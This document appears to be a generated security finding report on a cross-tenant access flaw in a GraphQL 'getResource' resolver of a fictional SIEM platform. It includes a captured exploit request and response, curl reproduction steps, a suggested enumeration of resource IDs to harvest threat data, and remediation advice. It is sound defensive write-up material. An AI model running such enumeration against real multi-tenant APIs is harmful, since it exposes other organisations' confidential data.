# Security Analysis Report
**System:** ThreatLens SOC Platform (Cybersecurity / SIEM)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0233 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design / Pattern 3.3 | Semantic ambiguity in over-broad `getResource` endpoint — attacker accesses cross-tenant SIEM threat intelligence data |

---

## Finding 1 — Semantic Ambiguity: Over-Broad Endpoint Enables Cross-Tenant SIEM Data Access (CRITICAL)

### Summary
The `getResource` resolver on ThreatLens SOC Platform (`api.threatlens-soc-platf.example.com`) is over-broadly designed: it operates on any `Resource` type regardless of context, with no semantic narrowing or ownership constraint. Per §5.0 Pattern 3.3, the endpoint's semantic ambiguity means a single resolver serves multiple resource types without enforcing the access control policies appropriate to each. The resolver does not validate that the fetched object's `tenantId` matches the JWT `tenantId` (§4.0 RISK-GQL-233). An attacker authenticated as `tenant-1450` exploited this ambiguity to retrieve threat intelligence resource `R-2233` belonging to `tenant-92c1`.

**Pattern:** 3.3 — Semantic ambiguity / over-broad endpoints (Insecure Design)
**Affected resolver:** `getResource(id: ID!): Resource`
**Affected endpoint:** `POST https://api.threatlens-soc-platf.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-1450`):**
```
POST https://api.threatlens-soc-platf.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-1450
Content-Type: application/json

{"query": "query VulnerableOp { getResource(id: \"R-2233\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-92c1",
      "ownerId": "other-user-145092c1",
      "data": {
        "sensitiveField": "CONFIDENTIAL-145092c1",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-145092c1`

In a SIEM/SOC platform, `Resource` objects include threat intelligence feeds, incident records, IOC lists, and detection rules. Cross-tenant access to these assets constitutes intelligence sharing between competing organizations — a critical confidentiality breach.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-233 | Resolver gap | No `tenantId` ownership check | Root cause |
| §5.0 Pattern 3.3 | Vulnerability | Semantic ambiguity — over-broad endpoint | Classification |
| HAR request | `id` | `R-2233` | Cross-tenant SIEM resource |
| HAR request | `x-tenant-id` | `tenant-1450` | Attacker tenant |
| HAR response | `tenantId` | `tenant-92c1` | Victim tenant — boundary crossed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-145092c1` | Threat intel / IOC data leaked |
| HAR response | `ownerId` | `other-user-145092c1` | Victim user confirmed |
| HAR headers | `x-request-id` | `req-145092c1` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-1450):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Query cross-tenant SIEM resource (VULNERABLE):**
```bash
curl -s -X POST https://api.threatlens-soc-platf.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-1450" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { getResource(id: \"R-2233\") { resourceId tenantId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.getResource'
# Expected VULNERABLE output: tenantId=tenant-92c1, sensitiveField=CONFIDENTIAL-145092c1
```

**Step 3 — Escalate to SIEM intelligence scraping:**
```bash
# Enumerate R-0001 through R-9999 to harvest IOC lists, threat feeds, incident records
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"errors":[{"message":"Forbidden: resource does not belong to your tenant"}]}
```

### Remediation

1. **Resolver tenancy check:** After fetching the resource, assert `resource.tenantId === context.auth.tenantId`; return 403/FORBIDDEN otherwise.
2. **Semantic narrowing:** Replace the generic `getResource` resolver with type-specific resolvers (e.g., `getIncident`, `getThreatFeed`, `getIOC`) that each enforce their own access control policies appropriate to the resource type.
3. **SIEM-specific access control:** Threat intelligence records require explicit sharing grants between organizations — implement an explicit sharing model (allow-list) for cross-tenant data access.
4. **Fix Redis cache key:** Include `tenantId` in cache key to prevent cross-tenant cache poisoning (§2.0).
5. **PostgreSQL RLS:** Enforce `tenant_id` row-level security as defence-in-depth.
